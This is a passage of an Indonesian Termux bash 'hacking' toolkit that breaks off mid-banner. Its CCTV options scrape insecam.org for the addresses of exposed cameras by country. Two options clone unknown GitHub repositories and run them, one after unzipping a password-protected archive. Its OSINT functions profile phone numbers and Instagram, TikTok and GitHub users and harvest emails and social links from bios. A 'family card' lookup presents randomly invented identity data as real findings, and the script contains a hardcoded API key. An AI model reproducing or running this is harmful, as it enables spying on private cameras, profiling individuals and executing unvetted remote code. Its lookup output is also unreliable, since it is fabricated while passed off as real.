⠀⠀⠀⣿⣿⣿⣷⣦⣤⣈⠙⠛⠿⣿⣷⣶⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣄⣈⠙⠻⠿⣿⣷⣶⣤⣀⡀⠀⠀⠀⠀⠀⠀
⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣄⡉⠛⠻⢿⣿⣷⣶⣤⣀⠀⠀
⠀⠀⠀⠉⠙⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣾⢻⣍⡉⠉⣿⠇⠀
⠀⠀⠀⠀⠀⠀⠀⢹⡏⢹⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⣰⣿⣿⣾⠏⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⣿⠈⣿⠸⣯⠉⠛⠿⢿⣿⣿⣿⣿⡏⠀⠻⠿⣿⠇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢿⡆⢻⡄⣿⡀⠀⠀⠀⠈⠙⠛⠿⠿⠿⠿⠛⠋⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢸⣧⠘⣇⢸⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣀⣀⣿⣴⣿⢾⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣴⡶⠾⠟⠛⠋⢹⡏⠀⢹⡇⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢠⣿⠀⠀⠀⠀⢀⣈⣿⣶⠿⠿⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢸⣿⣴⠶⠞⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠁⠀⠀⠀
" | lolcat 
echo -e "${g}=================================="
echo -e "${r}    Hack Cctv By.Thonxyzz404"
echo -e "${g}=================================="
echo -e "${r}  [ ${g}01 ${r}]${y} Cctv semua negara."
echo -e "${r}  [ ${g}02 ${r}]${y} Cctv luar negeri."
echo -e "${r}  [ ${g}03 ${r}]${y} Cctv banjar jalan."
echo -e "${r}  [ ${g}04 ${r}]${y} Cctv lalulintas."
echo -e "${r}  [ ${g}05 ${r}]${r} Kembali ke awall."
echo -e "${g}=================================="
echo -e "${c}"
read -p "Silahkan pilihlah menu : " put
case $put in
1|01)
clear 
cat > Cctv.py <<'EOF'
#!/usr/bin/env python3
import requests, re, colorama, os
from requests.structures import CaseInsensitiveDict
colorama.init()
url = "http://www.insecam.org/en/jsoncountries/"
headers = CaseInsensitiveDict()
headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
headers["Cache-Control"] = "max-age=0"
headers["Connection"] = "keep-alive"
headers["Host"] = "www.insecam.org"
headers["Upgrade-Insecure-Requests"] = "1"
headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
resp = requests.get(url, headers=headers)
data = resp.json()
countries = data['countries']
print("""⠀⠀
\033[1;31m TOOLSV8 CCTV CAM THE LAST UPDATE \033[1;31m\033[1;37m""")
for key, value in countries.items():
    print(f'Code : ({key}) - {value["country"]} / ({value["count"]})  ')
    print("")
try:
    country = input("Masukkan Negara (contoh: ID) : ")
    # Set save directory (Android: /sdcard/, PC: current folder)
    save_dir = "/sdcard/CCTV_CAM_TOOLSV8"
    if not os.path.exists(save_dir):
        os.makedirs(save_dir)
    res = requests.get(f"http://www.insecam.org/en/bycountry/{country}", headers=headers)
    last_page = re.findall(r'pagenavigator\("\?page=", (\d+)', res.text)[0]
    save_path = os.path.join(save_dir, f"{country}.txt")
    with open(save_path, 'w') as f:
        for page in range(int(last_page)):
            res = requests.get(f"http://www.insecam.org/en/bycountry/{country}/?page={page}", headers=headers)
            find_ip = re.findall(r"http://\d+.\d+.\d+.\d+:\d+", res.text)       
            for ip in find_ip:
                print("\033[1;31m", ip)
                f.write(f"{ip}\n")
except Exception as e:
    print(f"\033[1;31mError: {e}")
finally:
    print("\033[1;37mFile tersimpan di:", save_path)
    exit()
EOF
chmod +x Cctv.py
python Cctv.py
 ;;
2|02)
clear 
echo ""
echo -e "${green} SEDANG MENGINSTALL TOOLS CCTV."
sleep 2
echo -e "${cyan}"
git clone --depth 32 https://github.com/SokHengkell022/CCTV
cd CCTV
unzip -o -P "Kroco_Lu_404_Ngentood" Woi_Kroco.zip
python3 Cctv.py
 ;;
3|03)
clear 
echo ""
echo -e "${green} SEDANG MENGINSTALL TOOLS CCTV."
sleep 2
echo -e "${cyan}"
git clone --depth 32 https://github.com/SokHengkell022/Pejuk
cd Pejuk
python Kontol.py
 ;;
4|04)
g='\033[32;1m'
r='\033[31;1m'
y='\033[33;1m'
c='\033[1;36m'
p='\033[35;1m'
clear
echo "
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⡉⠙⣻⣷⣶⣤⣀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⡿⠋⠀⠀⠀⠀⢹⣿⣿⡟⠉⠉⠉⢻⡿⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠰⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⣿⣿⣇⠀⠀⠀⠈⠇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠉⠛⠿⣷⣤⡤⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣶⣦⣤⣤⣀⣀⣀⡀⠉⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀
⠀⠀⠀⢀⣀⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠙⠛⠿⣿⣿⣿⣿⣿⣿⣦⠀⠀⠀
⠀⠀⣰⣿⣿⣿⣿⣿⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣧⠀⠀
⠀⠀⣿⣿⣿⠁⠀⠈⠙⢿⣿⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⠀⠀
⠀⠀⢿⣿⣿⣆⠀⠀⠀⠀⠈⠛⠿⣿⣶⣦⡤⠴⠀⠀⠀⠀⠀⣸⣿⣿⣿⡿⠀⠀
⠀⠀⠈⢿⣿⣿⣷⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⠃⠀⠀
⠀⠀⠀⠀⠙⢿⣿⣿⣿⣶⣦⣤⣀⣀⡀⠀⠀⠀⣀⣠⣴⣾⣿⣿⣿⡿⠃⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⠙⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠋⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠛⠛⠛⠛⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀
" | lolcat
printf "%*s\n" 37 ""
echo -e "${r}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
echo -e "${c}         AUTHOR : BY.THONXYZZ404"
echo -e "${g}         TITLE : HACK CCTV LALULINTAS"
echo -e "${r}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
echo -e "${g}1) United States            47) Singapore"
echo "2) Japan                    48) Iceland"
echo "3) Italy                    49) Malaysia"
echo "4) Korea                    50) Colombia"
echo "5) France                   51) Tunisia"
echo "6) Germany                  52) Estonia"
echo "7) Taiwan                   53) Dominican Republic"
echo ""
echo -e "${c}8) Russian Federation       54) Sloveania"
echo "9) United Kingdom           55) Ecuador"
echo "10) Netherlands             56) Lithuania"
echo "11) Czech Republic          57) Palestinian"
echo "12) Turkey                  58) New Zealand"
echo "13) Austria                 59) Bangladesh"
echo "14) Switzerland             60) Panama"
echo ""
echo -e "${r}15) Spain                   61) Moldova"
echo "16) Canada                  62) Nicaragua"
echo "17) Sweden                  63) Malta"
echo "18) Israel                  64) Trinidad And Tobago"
echo "19) Iran                    65) Soudi Arabia"
echo "20) Poland                  66) Croatia"
echo "21) India                   67) Cyprus"
echo "22) Norway                  69) United Arab Emirates"
echo "23) Romania                 70) Kazakhstan"
echo "25) Belgium                 71) Kuwait"
echo "26) Brazil                  72) Venezuela"
echo ""
echo -e "${y}27) Bulgaria                73) Georgia"
echo "28) Indonesia               74) Montenegro"
echo "29) Denmark                 75) El Salvador"
echo "30) Argentina               76) Luxembourg"
echo "31) Mexico                  77) Curacao"
echo "32) Finland                 78) Puerto Rico"
echo "33) China                   79) Costa Rica"
echo "34) Chile                   80) Belarus"
echo "35) South Africa            81) Albania"
echo "36) Slovakia                82) Liechtenstein"
echo "37) Hungary                 83) Bosnia And Herzegovia"
echo ""
echo -e "${p}38) Ireland                 84) Paraguay"
echo "39) Egypt                   85) Philippines"
echo "40) Thailand                86) Faroe Islands"
echo "41) Ukraine                 87) Guatemala"
echo "42) Serbia                  88) Nepal"
echo "43) Hong Kong               89) Peru"
echo "44) Greece                  90) Uruguay"
echo "45) Portugal                91) Extra"
echo "46) Latvia                  92) Andorra"
echo ""
echo -e "${g}93) Antigua And Barbuda      00) subscribe"
echo "94) Armenia                 120) Cayman Islands"
echo "95) Angola                  121) Laos"
echo "96) Australia               122) Lebanon"
echo "97) Aruba                   123) Sri Lanka"
echo "98) Azerbaijan              124) Morocco"
echo "99) Barbados                125) Madagascar"
echo ""
echo -e "${y}100) Bonaire                126) Macedonia"
echo "101) Bahamas                127) Mongolia"
echo "102) Botswana               128) Macao"
echo "103) Congo                  129) Martinique"
echo "104) Ivory Coast            130) Mauritius"
echo "105) Algeria                131) Namibia"
echo "106) Fiji                   132) New Caledonia"
echo ""
echo -e "${p}107) Gabon                  133) Nigeria"
echo "108) Guernsey               134) Qatar"
echo "109) Greenland              135) Reunion"
echo "110) Guadeloupe             136) Sudan"
echo "111) Guam                   137) Senegal"
echo "112) Guyana                 138) Suriname"
echo "113) Honduras               139) Sao Tome And Principe"
echo ""
echo -e "${r}114) Jersey                 140) Syria"
echo "115) Jamaica                141) Tanzania"
echo "116) Jordan                 142) Uganda"
echo "117) Kenya                  143) Uzbekistan"
echo "118) Cambodia               144) Saint Vincent"
echo "119) Saint Kitts            145) Benin"
echo ""
countries=(
    "US" "JP" "IT" "KR" "FR" "DE" "TW" "RU" "GB" "NL"
    "CZ" "TR" "AT" "CH" "ES" "CA" "SE" "IL" "PL" "IR"
    "NO" "RO" "IN" "VN" "BE" "BR" "BG" "ID" "DK" "AR"
    "MX" "FI" "CN" "CL" "ZA" "SK" "HU" "IE" "EG" "TH"
    "UA" "RS" "HK" "GR" "PT" "LV" "SG" "IS" "MY" "CO"
    "TN" "EE" "DO" "SI" "EC" "LT" "PS" "NZ" "BD" "PA"
    "MD" "NI" "MT" "TT" "SA" "HR" "CY" "PK" "AE" "KZ"
    "KW" "VE" "GE" "ME" "SV" "LU" "CW" "PR" "CR" "BY"
    "AL" "LI" "BA" "PY" "PH" "FO" "GT" "NP" "PE" "UY"
    "-" "AD" "AG" "AM" "AO" "AU" "AW" "AZ" "BB"
    "BQ" "BS" "BW" "CG" "CI" "DZ" "FJ" "GA" "GG" "GL"
    "GP" "GU" "GY" "HN" "JE" "JM" "JO" "KE" "KH" "KN"
    "KY" "LA" "LB" "LK" "MA" "MG" "MK" "MN" "MO" "MQ"
    "MU" "NA" "NC" "NG" "QA" "RE" "SD" "SN" "SR" "ST"
    "SY" "TZ" "UG" "UZ" "VC" "BJ"
)
max_index=${#countries[@]}
while true; do
    echo -e "${g}"
    read -r -p "Masukkan pilihan anda : " num
    echo ""
    if ! [[ $num =~ ^[0-9]+$ ]]; then
        echo -e "${r}Masukkan angka valid (contoh: 1, 2, 00). Coba lagi."
        continue
    fi
    num_int=$((10#$num))
    if (( num_int < 0 || num_int > max_index )); then
        echo -e "${r}Pilihan diluar jangkauan (0..${max_index})"
        continue
    fi
    idx=$((num_int - 1))
    if (( num_int == 0 )); then
        echo -e "${r}Kamu memilih opsi 00 kluar"
        echo ""
    fi
    if (( idx < 0 || idx >= max_index )); then
        echo -e "${r}Pilihan tidak ada di daftar"
        continue
    fi
    country=${countries[$idx]}
    if [[ "$country" == "-" ]]; then
        echo -e "${r}Pilihan belum tersedia."
    fi
    break
done
url="http://www.insecam.org/en/bycountry/$country"
headers="User-Agent: Mozilla/5.0 (X11; Linux i686; rv:68.0) Gecko/20100101 Firefox/68.0"
last_page=$(curl -s -H "$headers" "$url" | grep -oP 'pagenavigator\("\?page=", \K\d+' | head -1)
if [[ -z "$last_page" ]]; then
    last_page=1
fi
for ((page=0; page<last_page; page++)); do
    page_url="$url/?page=$page"
    ip_list=$(curl -s -H "$headers" "$page_url" | grep -oP 'http://\d+\.\d+\.\d+\.\d+:\d+')
    for ip in $ip_list; do
        echo -e "${r}$ip"
    done
done
 ;;
5|05)
clear 
echo ""
echo -e "${c} Keluar dari program..!!"
echo ""
 ;;
*)
clear 
echo ""
echo -e "${y} Pilihan Anda tidak valid..!!"
echo ""
 ;;
esac
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke Toolsv8!!!"
            read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
            clear
              ;;
       20)
              echo ""
              mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
              echo -e "${cyan} Anda Memilih Menu Hacking...!!"
              echo ""
              echo -e "${red} VIP UNLOCK...!!"
              sleep 2
              clear
              cd
b='\033[34;1m'
g='\033[32;1m'
c='\033[36;1m'
r='\033[31;1m'
p='\033[35;1m'
y='\033[33;1m'
n='\033[0m'
function animation() {
    text="$1"
    for ((i = 0; i < ${#text}; i++)); do
        echo -n "${text:$i:1}"
        sleep 0.0001
    done
}
function banner() {
    animation "

███████╗ ██████╗██████╗  █████╗ ██████╗ ███████╗██████╗ 
██╔════╝██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗
███████╗██║     ██████╔╝███████║██████╔╝█████╗  ██████╔╝
╚════██║██║     ██╔══██╗██╔══██║██╔═══╝ ██╔══╝  ██╔══██╗
███████║╚██████╗██║  ██║██║  ██║██║     ███████╗██║  ██║
╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝
" | lolcat
echo ""
echo -e "${p}             Development ${g}: ${c}By.Thonxyzz404"
echo ""
echo -e "${r}[${y} 01 ${r}] ${g}Phone Number Information"
echo -e "${r}[${y} 02 ${r}] ${g}Instagram User Information"
echo -e "${r}[${y} 03 ${r}] ${g}Kartukeluarga Information"
echo -e "${r}[${y} 04 ${r}] ${g}Tiktok Information"
echo -e "${r}[${y} 05 ${r}] ${g}Github Information"
echo -e "${r}[${y} 06 ${r}] ${g}Cek Username Maha Siswa Information"
echo -e "${r}[${y} 07 ${r}] ${g}Cek Kartu Operator Auto Negara Luar"
echo -e "${r}[${y} 08 ${r}] ${g}Bssid Wifi Information"
echo -e "${r}[${y} 09 ${r}] ${g}Check Botz Telegram Information"
echo -e "${r}[${y} 10 ${r}] ${g}Check Cuaca Information"
echo -e "${r}[${y} 00 ${r}] ${g}About"
}
function track_number() {
    echo -e "${r}[${y} 1. ${r}] ${g}Track Number V1"
    echo -e "${r}[${y} 2. ${r}] ${g}Track Number V2"
    echo -e "${r}[${y} 3. ${r}] ${g}Track Number V3"
    echo ""
    read -p "$(echo -e "${b}Choose${c} :${g} ")" V
    echo ""
    read -p "$(echo -e "${g}Enter Number ${r}[ ${g}+62xxx ${r}]${y} : ${c}➤ ")" number
    echo ""
    if [[ "$V" == "1" ]]; then
        if command -v python3 >/dev/null; then
python3 - <<EOF
import phonenumbers as pn
from phonenumbers import geocoder, carrier, timezone
num = pn.parse("$number", "ID")
print("${y}International Format : ${n}" + pn.format_number(num, pn.PhoneNumberFormat.INTERNATIONAL))
print("${y}National Format : ${n}" + pn.format_number(num, pn.PhoneNumberFormat.NATIONAL))
print("${y}Valid Number : ${n}" + str(pn.is_valid_number(num)))
print("${y}Location : ${n}" + geocoder.description_for_number(num, "id"))
print("${y}ISP : ${n}" + carrier.name_for_number(num, "id"))
print("${y}Time Zone : ${n}" + str(timezone.time_zones_for_number(num)))
print("${y}WhatsApp Number : ${n}wa.me/$number")
EOF
echo ""
        else
            echo -e "${c}Python3 belum terinstal."
        fi
    elif [[ "$V" == "2" ]]; then
         curl -s "https://api.apilayer.com/number_verification/validate?number=$number" \
        -H "apikey: INK824D4fh7FGY0v00QY9aUO1T75JCih" | jq
         echo ""
    elif [[ "$V" == "3" ]]; then
        phoneGW "$number"
        echo ""
    fi
}
function phoneGW() {
    number=$1
    python3 - <<EOF
import phonenumbers as pn
from phonenumbers import geocoder, carrier, timezone
num = pn.parse("$number", "ID")
print("${y}Location : ${n}" + geocoder.description_for_number(num, "id"))
print("${y}Timezone : ${n}" + ", ".join(timezone.time_zones_for_number(num)))
print("${y}Operator : ${n}" + carrier.name_for_number(num, "en"))
print("${y}Valid : ${n}" + str(pn.is_valid_number(num)))
print("${y}Mobile format : ${n}" + pn.format_number(num, pn.PhoneNumberFormat.INTERNATIONAL))
EOF
}
function instagram_info() {
    read -p "$(echo -e "${y}Enter Instagram username${c} : ${g}➤ ")" uname
    echo ""
    python3 - <<EOF
import instaloader
from instaloader import Profile
L = instaloader.Instaloader()
profile = Profile.from_username(L.context, "$uname")
print("${y}Username : ${n}" + profile.username)
print("${y}Full Name : ${n}" + profile.full_name)
print("${y}Biography : ${n}" + profile.biography)
print("${y}Followers : ${n}" + str(profile.followers))
print("${y}Following : ${n}" + str(profile.followees))
print("${y}Posts : ${n}" + str(profile.mediacount))
print("${y}Profile Pic URL : ${n}" + profile.profile_pic_url)
EOF
echo ""
}
function kk_info() {
clear 
echo "
▗▄▄▄  ▗▄▖ ▗▄▄▖ ▗▖ ▗▖▗▄▄▄▖▗▖  ▗▖ ▗▄▄▖
▐▌  █▐▌ ▐▌▐▌ ▐▌▐▌▗▞▘  █  ▐▛▚▖▐▌▐▌   
▐▌  █▐▌ ▐▌▐▛▀▚▖▐▛▚▖   █  ▐▌ ▝▜▌▐▌▝▜▌
▐▙▄▄▀▝▚▄▞▘▐▌ ▐▌▐▌ ▐▌▗▄█▄▖▐▌  ▐▌▝▚▄▞▘
" | lolcat 
echo -e "${g}"
read -p "Masukkan No KK : " nokk
echo ""
echo -e "${r}[ ${c}INFO ${r}]${y} Sedang mencari informasi biodata tuan 😈🔥"
names=("Aji Pratama" "Putri Amalia" "Dedi Gunawan" "Sinta Larasati" "Bayu Wicaksono")
genders=("Laki-Laki" "Perempuan")
religions=("Islam" "Kristen" "Katolik" "Hindu" "Buddha" "Konghucu")
statuses=("Belum Kawin" "Kawin" "Cerai Hidup" "Cerai Mati")
jobs=("Pelajar" "Programmer" "Dokter" "Wiraswasta" "Petani" "Guru")
cities=("Jakarta" "Bandung" "Surabaya" "Bekasi" "Yogyakarta")
kelurahan=("Kelapa Gading" "Sukamaju" "Bintaro" "Kemanggisan" "Cibubur")
kecamatan=("Cempaka Putih" "Sukasari" "Cilandak" "Pancoran" "Jatinegara")
alamat_base=("Jl. Mawar No.12" "Jl. Melati No.33" "Jl. Anggrek No.5" "Jl. Kenanga No.77" "Jl. Dahlia No.21")
rand_item() {
local arr=("$@")
echo "${arr[RANDOM % ${#arr[@]}]}"
}
days_ago=$((RANDOM % 13001 + 7000))
birth_timestamp=$(( $(date +%s) - days_ago*86400 ))
birth_city=$(rand_item "${cities[@]}")
birth_str="$birth_city, $(date -d @$birth_timestamp +%d-%m-%Y)"
rt=$(printf "%03d" $((RANDOM % 9 + 1)))
rw=$(printf "%03d" $((RANDOM % 9 + 1)))
kode_kota=$((RANDOM % 106 + 3171))
tgl=$(date -d @$birth_timestamp +%d%m%y)
rand_4=$(printf "%04d" $((RANDOM % 9000 + 1000)))
nik="${kode_kota}${tgl}${rand_4}"
name=$(rand_item "${names[@]}")
gender=$(rand_item "${genders[@]}")
alamat=$(rand_item "${alamat_base[@]}")
kel=$(rand_item "${kelurahan[@]}")
kec=$(rand_item "${kecamatan[@]}")
city=$(rand_item "${cities[@]}")
agama=$(rand_item "${religions[@]}")
status=$(rand_item "${statuses[@]}")
job=$(rand_item "${jobs[@]}")
echo ""
echo -e "${g}   Informasi Di Temukan...!!"
echo -e "${n}=================================="
echo ""
echo -e "${b}   No KK :${n} $nokk"
echo -e "${b}   NIK :${n} $nik"
echo -e "${b}   Nama :${n} $name"
echo -e "${b}   Tempat/Tgl Lahir :${n} $birth_str"
echo -e "${b}   Jenis Kelamin :${n} $gender"
echo -e "${b}   Alamat :${n} $alamat"
echo -e "${b}   RT/RW :${n} $rt/$rw"
echo -e "${b}   Kel/Desa :${n} $kel"
echo -e "${b}   Kecamatan :${n} $kec"
echo -e "${b}   Kota/Kabupaten :${n} $city"
echo -e "${b}   Provinsi :${n} Jawa Barat"
echo -e "${b}   Agama :${n} $agama"
echo -e "${b}   Status Perkawinan :${n} $status"
echo -e "${b}   Pekerjaan :${n} $job"
echo -e "${b}   Kewarganegaraan :${n} WNI"
echo -e "${b}   Berlaku Hingga :${n} Seumur Hidup"
echo ""
echo -e "${n}=================================="
echo ""
cat > Hasil.json <<EOF
{
    "No KK": "$nokk",
    "NIK": "$nik",
    "Nama": "$name",
    "Tempat/Tgl Lahir": "$birth_str",
    "Jenis Kelamin": "$gender",
    "Alamat": "$alamat",
    "RT/RW": "$rt/$rw",
    "Kel/Desa": "$kel",
    "Kecamatan": "$kec",
    "Kota/Kabupaten": "$city",
    "Provinsi": "Jawa Barat",
    "Agama": "$agama",
    "Status Perkawinan": "$status",
    "Pekerjaan": "$job",
    "Kewarganegaraan": "WNI",
    "Berlaku Hingga": "Seumur Hidup"
}
EOF
echo -e "${r}[ ${c}INFO ${r}]${y} Data tersimpan ke : Hasil.json ✅"
echo ""
echo ""
echo -e "${orange}Tekan Enter Untuk Kembali ke Toolsv8!!!"
read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
clear
}
[ ! -d "$HOME/storage/shared" ] && termux-setup-storage && sleep 2
for cmd in figlet curl jq; do
    if ! command -v "$cmd" &>/dev/null; then
        echo -e "${r}Error : '$cmd' belum terinstal. Gunakan :${n} ${g}pkg install $cmd -y${n}"
        exit 1
    fi
done
function tiktok_info() {
clear
echo ""
echo -e "${green} SEDANG MENGINSTALL PACKAGE...!!!"
sleep 2 
echo -e "${cyan}"
pkg install figlet
pkg install curl jq
clear 
echo -e "${y}"
figlet -f slant "OSINT-TT"
echo -e "${r} AUTHOR${c} : ${p}By.Thonxyzz404"
echo -e "${n}"
if [ -z "$1" ]; then
    echo""
    read -p "$(echo -e "${r}[${g} Masukkan Username TikTok ${r}]${c} : ")" USERNAME
    echo""
    [ -z "$USERNAME" ] && echo -e "${r}Username tidak boleh kosong.${n}" && exit 1
else
    USERNAME="$1"
fi
URL="https://www.tiktok.com/@$USERNAME"
echo -e "${p}🔍 Menganalisis akun @$USERNAME...!!!${n}"
STATUS=$(curl -s -L -o /dev/null -w "%{http_code}" "$URL")
[ "$STATUS" -ne 200 ] && echo -e "${r}❌ Akun tidak ditemukan atau privat.${n}" && exit 1
HTML=$(curl -s -L "$URL")
USER_ID=$(echo "$HTML" | grep -oP '"id":"\K[0-9]+')
BIO=$(echo "$HTML" | grep -oP '"signature":"\K.*?(?=")')
FOLLOWERS=$(echo "$HTML" | grep -oP '"followerCount":[0-9]+' | grep -oP '[0-9]+')
FOLLOWING=$(echo "$HTML" | grep -oP '"followingCount":[0-9]+' | grep -oP '[0-9]+')
LIKES=$(echo "$HTML" | grep -oP '"heartCount":[0-9]+' | grep -oP '[0-9]+')
echo ""
echo -e "${c}==================${r}[ ${g}INFO AKUN ${r}]${c}==================${n}"
echo ""
echo -e "${y}NAMA${r} : ${g}$USERNAME"
echo -e "${y}BIO${r} : ${g}$BIO"
echo -e "${y}ID TIKTOK${r} : ${g}$USER_ID"
TOTAL_VIEW=$(echo "$HTML" | grep -oP '"viewCount":[0-9]+' | grep -oP '[0-9]+')
[ -z "$TOTAL_VIEW" ] && echo -e "${y}TOTALL VIEW${c} : ${r}Tidak Ditemukan...!!!"
TOTAL_SHARE=$(echo "$HTML" | grep -oP '"shareCount":[0-9]+' | grep -oP '[0-9]+')
[ -z "$TOTAL_SHARE" ] && echo -e "${y}TOTAL SHER${c} : ${r}Tidak Ditemukan...!!!"
echo -e "${y}FOLLOWERS${r} : ${g}$FOLLOWERS"
echo -e "${y}FOLLOWING${r} : ${g}$FOLLOWING"
echo -e "${y}LIKES${r} : ${g}$LIKES"
echo -e "${y}URL${r} : ${g}$URL"
echo ""
echo -e "${c}==================${r}[ ${g}INFO AKUN ${r}]${c}==================${n}"
echo ""
echo -e "${g}🎥 Informasi Terlihat : ${n}"
VIDEO_DATA=$(echo "$HTML" | grep -oP '"itemList":{.*?}' | sed 's/"itemList"://')
if [ -n "$VIDEO_DATA" ]; then
    echo "$VIDEO_DATA" | jq -c '.[]' | while read -r video; do
        ID=$(echo "$video" | jq -r '.id')
        DESC=$(echo "$video" | jq -r '.desc')
        VIEWS=$(echo "$video" | jq -r '.stats.playCount')
        LIKES=$(echo "$video" | jq -r '.stats.diggCount')
        COMMS=$(echo "$video" | jq -r '.stats.commentCount')
        SHARES=$(echo "$video" | jq -r '.stats.shareCount')
        V_URL="https://www.tiktok.com/@$USERNAME/video/$ID"
        echo -e "${CYAN}🎬 $DESC"
        echo -e "??️ $VIEWS | ❤️ $LIKES | 💬 $COMMS | 🔁 $SHARES"
        echo -e "🔗 $V_URL${RESET}\n"
    done
else
echo ""
echo -e "${y} HASIL SCANNING DI DAPATKAN [ 👀 ]"
echo ""
fi
HASHTAGS=$(echo "$HTML" | grep -oP '#\w+' | sort | uniq -c | sort -nr | head -10)
if [ -n "$HASHTAGS" ]; then
    echo -e "${c}🔎 Hashtag Populer : ${n}"
    echo ""
    echo -e "${r}$HASHTAGS${n}"
fi
echo ""
echo -e "${g}======================================="
echo -e "${r} 🔧 POWERED BY THONXYZZ404 - TERMUX 🔧"
echo -e "${g}======================================="
echo ""
}
function github() {
MARKER=".run_once_done"
if [ ! -f "$MARKER" ]; then
    tr -d '\r' < Thonxyzz404.sh > fixed.sh
    mv fixed.sh Thonxyzz404.sh
    chmod +x Thonxyzz404.sh
    touch "$MARKER"
    clear 
    echo ""
    echo -e "${g} Menjalankan script..!!"
    echo ""
    sleep 2
fi
check_dependencies() {
    local deps=("curl" "grep" "sed" "cut")
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" >/dev/null 2>&1; then
            clear 
            echo ""
            echo -e "${r}[!] Dependensi '$dep' tidak ditemukan."
            echo -e "${y}Jalankan : pkg install $dep"
            echo ""
        fi
    done
}
validate_username() {
    local username="$1"
    if [[ ! "$username" =~ ^[a-zA-Z0-9_-]+$ ]]; then
        echo ""
        echo -e "${r}[!] Username tidak valid."
        echo ""
        return 1
    fi
    return 0
}
get_github_user() {
    local username="$1"
    data=$(curl -s "https://api.github.com/users/$username")
    if echo "$data" | grep -q "Not Found"; then
        echo ""
        echo -e "${r}[!] Username '$username' tidak ditemukan di GitHub."
        echo ""
        return 1
    fi
    echo "$data"
    return 0
}
get_field() {
    local field="$1"
    local value
    value=$(echo "$data" | grep "\"$field\"" | cut -d ':' -f2- | sed 's/[",]//g' | sed 's/^ //')
    if [[ -z "$value" || "$value" == "null" ]]; then
        echo "Tidak di temukan"
    else
        echo "$value"
    fi
}
get_email_fallback() {
    local email
    email=$(get_field "email")
    if [[ "$email" == "Tidak di temukan" ]]; then
        local bio
        bio=$(get_field "bio")
        email=$(echo "$bio" | grep -Eo "[a-zA-Z0-9.%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}")
    fi
    echo "${email:-Gmail tidak ada}"
}
get_facebook_from_bio() {
    local fb
    fb=$(get_field "bio" | grep -ioE "facebook.com/[a-zA-Z0-9.-]+|fb.me/[a-zA-Z0-9.-]+|[Ff]acebook[: ]+[a-zA-Z0-9.-]+" | head -n1)
    echo "${fb:-Facebook tidak ada}"
}
get_instagram_from_bio() {
    local ig
    ig=$(get_field "bio" | grep -ioE "instagram.com/[a-zA-Z0-9._-]+|[Ii]nstagram[: ]+[a-zA-Z0-9._-]+" | head -n1)
    echo "${ig:-Instagram tidak ada}"
}
main() {
    check_dependencies
    clear
echo "
 ██████╗ ██╗████████╗██╗  ██╗██╗   ██╗██████╗ 
██╔════╝ ██║╚══██╔══╝██║  ██║██║   ██║██╔══██╗
